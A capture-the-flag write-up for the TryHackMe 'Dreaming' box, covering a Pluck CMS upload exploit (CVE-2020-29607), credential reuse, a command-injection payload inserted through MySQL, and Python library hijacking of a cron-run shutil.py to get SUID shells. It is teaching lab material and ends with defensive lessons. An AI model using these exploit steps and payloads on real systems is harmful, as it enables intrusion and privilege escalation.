# TryHackMe — Dreaming (Writeup)

**Difficulty:** Easy
**OS:** Linux (Ubuntu 20.04)
**Tags:** Pluck CMS, CVE-2020-29607, Command Injection, Python Library Hijacking

---

## Summary

"Dreaming" is a Linux CTF box on TryHackMe, based on Neil Gaiman's Sandman universe. It contains 3 flags (Lucien, Death, Morpheus), each corresponding to lateral movement or privilege escalation to a different user. Attack chain:

```
www-data → lucien → death → morpheus
```

---

## 1. Enumeration

### Nmap Scan

```bash
nmap -sC -sV -p- 10.113.139.96
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 |
| 80   | HTTP    | Apache 2.4.41 (Ubuntu) |

The landing page (port 80) is the default Apache page ("It works").

### Directory Enumeration

```bash
gobuster dir -u http://10.113.139.96 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

**Results:**

| Path | Status |
|------|--------|
| /app | 301 (Redirect) |

Inside `/app/` there's a directory listing with the folder `pluck-4.7.13/`.

This is **Pluck CMS version 4.7.13**.

---

## 2. Initial Access — CVE-2020-29607

### Login to Pluck CMS

The login page is at:

```
http://10.113.139.96/app/pluck-4.7.13/login.php
```

It only asks for a password (no username). Trying `password` → **successful login**.

### Searchsploit

```bash
searchsploit pluck 4.7.13
```

```
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated) | php/webapps/49909.py
```

This is **CVE-2020-29607** — a file upload restriction bypass that allows uploading a PHP webshell.

### Running the Exploit

```bash
searchsploit -m 49909.py
python3 49909.py 10.113.139.96 80 password /app/pluck-4.7.13
```

The exploit uploads a **p0wny-shell** (web shell) as `shell.phar`:

```
http://10.113.139.96/app/pluck-4.7.13/files/shell.phar
```

```bash
whoami
# www-data
```

We now have an **initial foothold** as `www-data`.

---

## 3. www-data → Lucien (Credential Discovery)

### Enumeration as www-data

```bash
ls /home
# death  lucien  morpheus  ubuntu
```

Lucien's flag (`/home/lucien/lucien_flag.txt`) is not readable as www-data.

### Credentials in a Python Script

```bash
cat /opt/test.py
```

```python
import requests
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"
...
```

Lucien uses the password **`HeyLucien#@1999!`** for the Pluck CMS. We try reusing it over SSH:

```bash
ssh lucien@10.113.139.96
# Password: HeyLucien#@1999!
```

### Lucien Flag

```bash
cat ~/lucien_flag.txt
# THM{TH3_L1BR4R14N}
```

---

## 4. Lucien → Death (SQL Injection + Command Injection)

### sudo -l

```bash
sudo -l
```

```
(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

Lucien can run `getDreams.py` as **death** without a password.

### Analyzing getDreams.py

The script connects to the MySQL database `library`, pulls data from the `dreams` table, and passes it into a subprocess:

```python
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
```

Using `shell=True` with user-controlled input → **command injection vulnerability**.

### MySQL Credentials

From lucien's `.bash_history`:

```
mysql -u lucien -plucien42DBPASSWORD
```

MySQL password: **`lucien42DBPASSWORD`**

### Exploitation

```bash
mysql -u lucien -plucien42DBPASSWORD library
```

```sql
USE library;
INSERT INTO dreams (dreamer, dream) VALUES ("hack", "$(cp /bin/bash /tmp/deathbash && chmod u+s /tmp/deathbash)");
exit
```

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
/tmp/deathbash -p
whoami
# death
```

### Death Flag

```bash
cat /home/death/death_flag.txt
# THM{1M_TH3R3_4_TH3M}
```

---

## 5. Death → Morpheus (Python Library Hijacking)

### Enumeration as death

```bash
sudo -l
# Sorry, user death may not run sudo on ip-10-113-139-96.
```

No sudo privileges. Looking elsewhere.

### Writable Files

```bash
ls -la /usr/lib/python3.8/shutil.py
# -rw-rw-r-- 1 root death 51474 Mar 18 2025 /usr/lib/python3.8/shutil.py
```

The **death group** has write access to `shutil.py`!

### Morpheus's restore.py

```bash
cat /home/morpheus/restore.py
```

```python
from shutil import copy2 as backup
src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"
backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

This does `import shutil` and runs as a **cron job** owned by morpheus.

### Python Library Hijacking

We prepend malicious code to `shutil.py`:

```bash
cp /usr/lib/python3.8/shutil.py /tmp/shutil_backup.py
echo 'import os; os.system("cp /bin/bash /tmp/morphbash && chmod u+s /tmp/morphbash")' > /tmp/payload.py
cat /tmp/payload.py /tmp/shutil_backup.py > /tmp/shutil_new.py
cp /tmp/shutil_new.py /usr/lib/python3.8/shutil.py
```

After ~1 minute (cron execution):

```bash
ls -la /tmp/morphbash
# -rwsr-xr-x 1 morpheus morpheus 1183448 Jun 26 01:10 /tmp/morphbash

/tmp/morphbash -p
whoami
# morpheus
```

### Morpheus Flag

```bash
cat /home/morpheus/morpheus_flag.txt
```

---

## Attack Chain Summary

```
Nmap + Gobuster
    │
    ▼
Pluck CMS 4.7.13 (weak password: "password")
    │
    ▼
CVE-2020-29607 (File Upload RCE) → webshell as www-data
    │
    ▼
Credential discovery in /opt/test.py → SSH as lucien
    │
    ▼
sudo getDreams.py as death + SQL command injection → shell as death
    │
    ▼
Python library hijacking (writable shutil.py + cron) → shell as morpheus
```

---

## Lessons Learned

- **Credential reuse**: Lucien's password was hardcoded in a test script, and it also worked over SSH.
- **bash_history**: Never leave passwords in command history (e.g. `mysql -p<password>`).
- **subprocess + shell=True**: In Python, never pass user input into a subprocess with `shell=True` — use `subprocess.run()` with list arguments instead.
- **File permissions**: Writable system libraries (shutil.py) combined with cron jobs = privilege escalation.
- **Defense in depth**: Every layer (CMS, SSH, MySQL, cron) had its own individual weakness. Had any one of them been patched, the chain would have broken.
